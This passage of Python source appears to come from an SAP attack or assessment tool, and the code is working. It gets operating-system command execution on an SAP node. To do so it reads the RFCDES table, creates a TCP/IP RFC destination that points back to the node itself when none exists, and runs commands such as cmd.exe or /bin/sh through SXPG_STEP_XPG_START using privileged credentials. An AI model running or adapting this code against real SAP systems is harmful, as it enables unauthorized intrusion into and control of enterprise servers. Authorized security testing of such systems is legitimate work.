                DESTINATION=destination,
                EXTPROG=command,
                PARAMS=params,
                STDINCNTL="R",
                STDOUTCNTL="M",
                STDERRCNTL="M",
                TRACECNTL="0",
                TERMCNTL="C",
                TRACELEVEL="0",
                LONG_PARAMS="",
                CONNCNTL="H",
            )

            # Parse LOG table for output lines
            log_table = call_result.get("LOG", [])
            for row in log_table:
                line = ""
                if isinstance(row, dict):
                    line = (row.get("MESSAGE", "") or
                            row.get("LINE", "") or
                            row.get("TEXT", "")).strip()
                elif isinstance(row, str):
                    line = row.strip()
                if line:
                    result["output"].append(line)

            # Check return status
            ret_status = call_result.get("STATUS", "")
            if str(ret_status).strip() in ("O", "0", ""):
                result["success"] = True
            elif result["output"]:
                # Some systems return output even on non-zero status
                result["success"] = True
            else:
                result["error"] = f"SXPG status: {ret_status}"

    except Exception as e:
        result["error"] = str(e)
        logger.debug(f"SXPG remote command failed via {destination}: {e}")

    return result


def execute_local_command(node: SAPNode, command: str, params: str,
                          creds: Credentials = None) -> dict:
    """Execute an OS command on the node itself via SXPG_STEP_XPG_START.

    Creates a self-referencing TCP/IP destination (pointing to localhost)
    if one doesn't already exist, then calls execute_remote_command().

    Args:
        node: target SAP system (must have credentials with SAP_ALL)
        command: executable to run (e.g. cmd.exe or /bin/sh)
        params: command parameters
        creds: credentials on the system

    Returns dict with: success, output (list of lines), error
    """
    result = {"success": False, "output": [], "error": ""}

    # Look for an existing self-referencing TCP/IP destination
    dest_name = None
    try:
        with _get_connection(node, creds) as conn:
            try:
                table_result = conn.call(
                    "RFC_READ_TABLE",
                    QUERY_TABLE="RFCDES",
                    DELIMITER="|",
                    FIELDS=[{"FIELDNAME": "RFCDEST"}, {"FIELDNAME": "RFCTYPE"},
                            {"FIELDNAME": "RFCOPTIONS"}],
                    OPTIONS=[{"TEXT": "RFCTYPE = 'T'"}],
                    ROWCOUNT=500,
                )
                for row in table_result.get("DATA", []):
                    line = row.get("WA", "") if isinstance(row, dict) else str(row)
                    parts = line.split("|")
                    if len(parts) >= 3:
                        name = parts[0].strip()
                        opts = parts[2].strip().upper()
                        # Self-referencing: points to localhost or own host
                        if ("SAPXPG" in opts or "PROGRAM=SAPXPG" in opts):
                            host_lower = (node.ip or node.hostname or "").lower()
                            if ("LOCALHOST" in opts or "127.0.0.1" in opts
                                    or (host_lower and host_lower.upper() in opts)):
                                dest_name = name
                                break
            except Exception:
                pass  # RFC_READ_TABLE might not be available
    except Exception:
        pass

    # Create one if not found
    if not dest_name:
        host = node.ip or node.hostname
        if not host:
            result["error"] = "No IP/hostname for node"
            return result

        # Find own gateway port
        gw_port = None
        for inst in node.instances:
            for port, svc in inst.ports.items():
                if svc == "gateway" or (3300 <= port <= 3399):
                    gw_port = str(port)
                    break
            if gw_port:
                break
        if not gw_port:
            gw_port = "3300"

        create_result = create_tcpip_destination(
            node, target_host=host, target_sid=node.sid,
            target_gw_port=gw_port, creds=creds,
        )
        if not create_result["success"]:
            result["error"] = f"Could not create TCP/IP dest: {create_result['message']}"
            return result
        dest_name = create_result["dest_name"]

    # Execute command via the destination
    return execute_remote_command(node, dest_name, command, params, creds)
